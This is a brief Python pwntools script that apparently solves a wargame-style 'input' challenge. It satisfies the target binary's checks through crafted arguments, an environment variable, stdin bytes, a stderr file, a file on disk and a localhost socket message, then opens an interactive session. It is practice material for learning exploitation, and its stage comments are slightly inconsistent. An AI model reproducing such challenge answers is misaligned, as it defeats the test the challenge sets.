from pwn import *
import socket

# stage 4
with open("\x0a", "wb") as f:
    f.write(b"\x00\x00\x00\x00")

# stage 1
argv = ["" for i in range(100)]
argv[0] = "/home/input2/input"
argv[0x41] = "\x00"
argv[0x42] = "\x20\x0a\x0d"

# stage 5
argv[0x43] = "12345"

p = process(
    argv,
    stderr=open("/tmp/h0meb0dy/stderr", "rb"),
    env={"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"},
)

# stage 2
p.send(b"\x00\x0a\x00\xff")

# stage 5
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = ("localhost", 12345)
sock.connect(addr)
sock.send("\xde\xad\xbe\xef")

p.interactive()
